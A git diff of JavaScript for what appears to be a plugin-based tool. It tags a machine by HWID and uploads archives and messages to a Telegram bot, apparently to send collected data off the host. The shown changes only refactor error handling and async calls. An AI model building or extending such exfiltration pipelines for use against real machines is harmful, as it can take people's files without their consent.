@@ -55,10 +55,11 @@ async function sendMessageTelegramWebhook(text, telegramChatId, telegramToken, r
       method: 'POST',
       body: form
     }
-  ).then(res => res.json())
+  )
 
   if (!res.ok) {
-    console.error(`Error sending Telegram message! Retrying in 30s - Status: ${res.error_code} - ${res.description}`)
+    const json = await res.json()
+    console.error(`Error sending Telegram message! Retrying in 30s - Status: ${json.error_code} - ${json.description}`)
     // Failed to send message, try again in 30s
     await new Promise(resolve => setTimeout(resolve, 30_000))
     return sendMessageTelegramWebhook(text, telegramChatId, telegramToken, retriesLeft - 1)
@@ -94,10 +95,11 @@ async function sendDocumentTelegramWebhook(
       method: 'POST',
       body: form
     }
-  ).then(res => res.json())
+  )
 
   if (!res.ok) {
-    console.error(`Error sending archive! Retrying in 30s - Status: ${res.error_code} - ${res.description}`)
+    const json = await res.json()
+    console.error(`Error sending archive! Retrying in 30s - Status: ${json.error_code} - ${json.description}`)
     // Failed to send archive, try again in 30s
     await new Promise(resolve => setTimeout(resolve, 30_000))
     return sendDocumentTelegramWebhook(filePath, filename, caption, telegramChatId, telegramToken, retriesLeft - 1)
@@ -134,19 +136,19 @@ async function run(telegramChatId, telegramToken, addDelays = true) {
       console.log(`\n\nRunning plugin [${pluginName}]! ⭐`)
       const messageCaptionPrefix = `Plugin: \`${pluginName}\`\nHWID: \`${hwid.slice(0, 20)}\``
 
-      const uploadFileFn = (filePath, filename, caption) => {
-        console.log(`[${pluginName}] uploaded a file via Telegram: \`${filename}\` - ${caption}`)
-        return sendDocumentTelegramWebhook(
+      const uploadFileFn = async (filePath, filename, caption) => {
+        await sendDocumentTelegramWebhook(
           filePath,
           filename,
           `${messageCaptionPrefix}\n\n${caption.trim()}`,
           telegramChatId,
           telegramToken
         )
+        console.log(`[${pluginName}] uploaded a file via Telegram: \`${filename}\` - ${caption}`)
       }
-      const sendMessageFn = text => {
+      const sendMessageFn = async text => {
+        await sendMessageTelegramWebhook(`${messageCaptionPrefix}\n\n${text.trim()}`, telegramChatId, telegramToken)
         console.log(`[${pluginName}] sent a message via Telegram: \`${text}\``)
-        return sendMessageTelegramWebhook(`${messageCaptionPrefix}\n\n${text.trim()}`, telegramChatId, telegramToken)
       }
 
       const result = await plugin.run({ sendMessageFn, uploadFileFn })
@@ -164,7 +166,7 @@ async function run(telegramChatId, telegramToken, addDelays = true) {
     }
   }
 
-  console.log('\nEvery plugin finished executing! 🎉')
+  console.log('\nEvery plugins finished executing! 🎉')
   Object.entries(pluginSuccess).forEach(([pluginName, success]) =>
     console.log(success ? `✅ Plugin [${pluginName}] was successful!` : `Plugin [${pluginName}] failed! ❌`)
   )
